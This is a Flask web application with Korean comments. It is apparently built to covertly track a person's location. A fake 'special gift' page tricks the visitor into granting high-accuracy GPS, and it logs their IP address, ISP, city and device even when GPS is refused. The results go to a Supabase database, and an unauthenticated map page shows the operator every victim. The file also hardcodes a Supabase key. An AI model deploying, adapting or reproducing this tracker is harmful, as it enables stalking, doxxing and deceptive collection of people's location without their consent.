from flask import Flask, request, render_template_string, jsonify
from supabase import create_client, Client
import requests
import json
from datetime import datetime
import user_agents

app = Flask(__name__)

# ===== Supabase 설정 =====
SUPABASE_URL = "https://lcxjsexvecrrjxkwdumkm.supabase.co"
SUPABASE_KEY = "sb_publishable_Ie3ORI9_y5VVpLfqwXVh_g_Ud6uFVU6"
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# ============================================================
# IP 정보 조회 함수 (ip-api.com 무료 API)
# ============================================================
def get_ip_info(ip):
    try:
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,timezone,proxy,query', timeout=5)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'region': data.get('regionName', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0),
                'isp': data.get('isp', 'Unknown'),
                'org': data.get('org', 'Unknown'),
                'as': data.get('as', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown'),
                'proxy': data.get('proxy', False)
            }
        else:
            return {'error': data.get('message', 'API error')}
    except Exception as e:
        return {'error': str(e)}

# ============================================================
# HTML: 상대방이 보는 페이지 (YES=선물, NO=귀신)
# ============================================================
TRACK_PAGE = '''
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎁</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; font-family: 'Arial Black', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; color: white; padding: 20px; }
        .container { background: #1a1a2e; padding: 40px 30px; border-radius: 30px; text-align: center; box-shadow: 0 0 50px rgba(255, 200, 0, 0.2); max-width: 500px; width: 100%; }
        .emoji-big { font-size: 80px; margin-bottom: 20px; display: block; }
        h1 { font-size: 24px; color: #ffcc00; text-shadow: 0 0 20px rgba(255, 200, 0, 0.3); margin-bottom: 10px; }
        .sub { font-size: 16px; color: #aaa; margin-bottom: 30px; }
        .btn-group { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
        .btn { padding: 20px 50px; font-size: 28px; font-weight: bold; border: none; border-radius: 60px; cursor: pointer; transition: all 0.3s; min-width: 130px; flex: 1; }
        .btn-yes { background: linear-gradient(135deg, #ffcc00, #ff9900); color: #000; box-shadow: 0 0 30px rgba(255, 200, 0, 0.3); }
        .btn-no { background: linear-gradient(135deg, #ff3366, #cc0044); color: #fff; box-shadow: 0 0 30px rgba(255, 51, 102, 0.3); }
        #result-area { margin-top: 30px; min-height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .result-emoji { font-size: 100px; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .result-text { font-size: 20px; margin-top: 15px; color: #ddd; }
        @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
        .shake { animation: shake 0.3s ease-in-out 3; }
        #status-tip { font-size: 13px; color: #555; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container" id="app">
    <span class="emoji-big">🎁</span>
    <h1>특별 선물이 도착했어요!</h1>
    <p class="sub">당신을 위해 준비했습니다. 받으시겠어요?</p>
    <div class="btn-group">
        <button class="btn btn-yes" id="btnYes">✔ YES</button>
        <button class="btn btn-no" id="btnNo">✘ NO</button>
    </div>
    <div id="result-area"></div>
    <div id="status-tip">👆 버튼을 눌러보세요</div>
</div>
<script>
document.getElementById('btnYes').addEventListener('click', function() {
    document.getElementById('btnYes').disabled = true;
    document.getElementById('btnNo').disabled = true;
    const resultArea = document.getElementById('result-area');
    resultArea.innerHTML = '<div class="result-emoji">🎁</div><div class="result-text">🎉 선물이 열렸어요! 잠시만 기다려주세요...</div>';
    document.getElementById('status-tip').textContent = '⏳ 선물을 준비 중입니다...';

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        lat: lat, 
                        lon: lon, 
                        acc: position.coords.accuracy, 
                        time: new Date().toISOString(),
                        ua: navigator.userAgent
                    })
                })
                .then(res => res.json())
                .then(() => {
                    resultArea.innerHTML = '<div class="result-emoji">🎉🎁🎉</div><div class="result-text">🎊 선물이 도착했습니다! 감사합니다!</div>';
                    document.getElementById('status-tip').textContent = '✅ 선물이 전달되었습니다!';
                })
                .catch(() => {
                    resultArea.innerHTML = '<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! (위치 전송은 실패했어요)</div>';
                    document.getElementById('status-tip').textContent = '⚠️ 네트워크 오류, 하지만 선물은 받으셨어요!';
                });
            },
            function(error) {
                // GPS 거부 시에도 IP는 수집됨 (UA만 전송)
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        lat: null, 
                        lon: null, 
                        acc: null, 
                        time: new Date().toISOString(),
                        ua: navigator.userAgent
                    })
                });
                resultArea.innerHTML = '<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! 🎉</div>';
                document.getElementById('status-tip').textContent = '⚠️ 위치 권한을 거부하셨지만, 선물은 드립니다!';
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    } else {
        resultArea.innerHTML = '<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! 🎉</div>';
        document.getElementById('status-tip').textContent = '⚠️ 이 브라우저는 위치를 지원하지 않아요, 하지만 선물은 드립니다!';
    }
    setTimeout(() => {
        document.getElementById('btnYes').disabled = false;
        document.getElementById('btnNo').disabled = false;
    }, 3000);
});

document.getElementById('btnNo').addEventListener('click', function() {
    document.getElementById('btnYes').disabled = true;
    document.getElementById('btnNo').disabled = true;
    const resultArea = document.getElementById('result-area');
    document.body.style.background = '#0a0000';
    document.querySelector('.container').style.boxShadow = '0 0 80px rgba(255, 0, 0, 0.5)';
    resultArea.innerHTML = '<div class="result-emoji shake">👻</div><div class="result-text" style="color:#ff3366;">😱 귀신이 나타났습니다! 도망가세요!</div>';
    document.getElementById('status-tip').textContent = '👻 당신은 귀신을 불렀습니다...';
    setTimeout(() => {
        document.body.style.background = '#1a0000';
        resultArea.innerHTML = '<div class="result-emoji" style="font-size:120px;">💀</div><div class="result-text" style="color:#ff0000; font-size:24px;">당신은 저주받았습니다...</div>';
    }, 2000);
    setTimeout(() => {
        document.body.style.background = '#0a0a0a';
        document.querySelector('.container').style.boxShadow = '0 0 50px rgba(255, 200, 0, 0.2)';
        resultArea.innerHTML = '<div class="result-emoji">👻</div><div class="result-text" style="color:#888;">...다시 시도하시겠어요?</div>';
        document.getElementById('status-tip').textContent = '👆 YES를 누르면 선물을 드려요';
        document.getElementById('btnYes').disabled = false;
        document.getElementById('btnNo').disabled = false;
    }, 5000);
});
</script>
</body>
</html>
'''

# ============================================================
# MAP_PAGE: 내가 보는 지도 + IP + 통신사 + 기기 정보
# ============================================================
MAP_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 수집된 위치 및 IP 정보</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        #map { height: 60vh; width: 100%; }
        .info { 
            position: relative; 
            background: rgba(0,0,0,0.9); 
            color: #0f0; 
            padding: 20px; 
            border-radius: 10px; 
            font-family: monospace; 
            font-size: 14px; 
            max-height: 40vh; 
            overflow-y: auto; 
            margin: 10px;
            border: 1px solid #333;
        }
        .info h3 { color: #ffcc00; margin-top: 0; }
        .entry { 
            border-bottom: 1px solid #222; 
            padding: 10px 0; 
        }
        .entry:last-child { border-bottom: none; }
        .badge { 
            display: inline-block; 
            background: #1a1a2e; 
            padding: 2px 10px; 
            border-radius: 20px; 
            margin: 2px 0;
            font-size: 12px;
            color: #aaa;
        }
        .highlight { color: #00ff88; }
        .danger { color: #ff3366; }
    </style>
</head>
<body>
    <div id="map"></div>
    <div class="info" id="info">
        <h3>📍 수집된 정보 (<span id="count">0</span>건)</h3>
        <div id="list"></div>
    </div>
    <script>
        const map = L.map('map').setView([37.5665, 126.9780], 5);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        
        function updateData() {
            fetch('/api/all')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('count').textContent = data.length;
                    const list = document.getElementById('list');
                    list.innerHTML = '';
                    
                    data.forEach((item, i) => {
                        const div = document.createElement('div');
                        div.className = 'entry';
                        div.innerHTML = `
                            <div><span class="badge">#${i+1}</span> <span class="highlight">IP: ${item.ip || 'N/A'}</span></div>
                            <div>📱 ${item.device || 'Unknown'} | ${item.os || 'Unknown OS'}</div>
                            <div>📡 ${item.isp || 'Unknown ISP'} | ${item.org || ''}</div>
                            <div>📍 ${item.city || 'Unknown'}, ${item.region || ''} (${item.country || ''})</div>
                            <div>🕒 ${item.received_at ? new Date(item.received_at).toLocaleString() : 'N/A'}</div>
                            <div>🌐 ${item.proxy ? '⚠️ 프록시 사용 의심' : '✅ 일반 연결'}</div>
                            <hr style="border-color:#222;">
                        `;
                        list.appendChild(div);
                        
                        // 지도에 마커 추가
                        if (item.lat && item.lon) {
                            L.marker([item.lat, item.lon]).addTo(map)
                                .bindPopup(`
                                    <b>IP: ${item.ip}</b><br>
                                    📱 ${item.device}<br>
                                    📡 ${item.isp}<br>
                                    📍 ${item.city}, ${item.region}
                                `);
                        }
                    });
                });
        }
        updateData();
        setInterval(updateData, 10000);
    </script>
</body>
</html>
'''

# ============================================================
# Flask Routes (IP + GPS + 기기 정보 통합 저장)
# ============================================================
@app.route('/')
def track():
    return render_template_string(TRACK_PAGE)

@app.route('/map')
def map_view():
    return render_template_string(MAP_PAGE)

@app.route('/api/track', methods=['POST'])
def track_data():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400

    # 1. IP 주소 추출
    client_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if client_ip and ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()

    # 2. IP 정보 조회 (ip-api.com)
    ip_info = get_ip_info(client_ip)

    # 3. User-Agent 분석 (기기 종류)
    ua_string = data.get('ua', '')
    ua = user_agents.parse(ua_string) if ua_string else None
    device_info = {
        'device': ua.device.family if ua else 'Unknown',
        'os': ua.os.family if ua else 'Unknown',
        'browser': ua.browser.family if ua else 'Unknown'
    }

    # 4. Supabase에 저장
    try:
        result = supabase.table('locations').insert({
            'ip': client_ip,
            'lat': data.get('lat'),
            'lon': data.get('lon'),
            'acc': data.get('acc'),
            'time': data.get('time'),
            'received_at': datetime.now().isoformat(),
            'country': ip_info.get('country'),
            'region': ip_info.get('region'),
            'city': ip_info.get('city'),
            'isp': ip_info.get('isp'),
            'org': ip_info.get('org'),
            'as': ip_info.get('as'),
            'timezone': ip_info.get('timezone'),
            'proxy': ip_info.get('proxy'),
            'device': device_info['device'],
            'os': device_info['os'],
            'browser': device_info['browser'],
            'ua_raw': ua_string
        }).execute()
        return jsonify({'status': 'ok', 'id': result.data[0]['id']})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/all', methods=['GET'])
def get_all_data():
    try:
        result = supabase.table('locations').select('*').execute()
        return jsonify(result.data)
    except Exception as e:
        return jsonify([])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)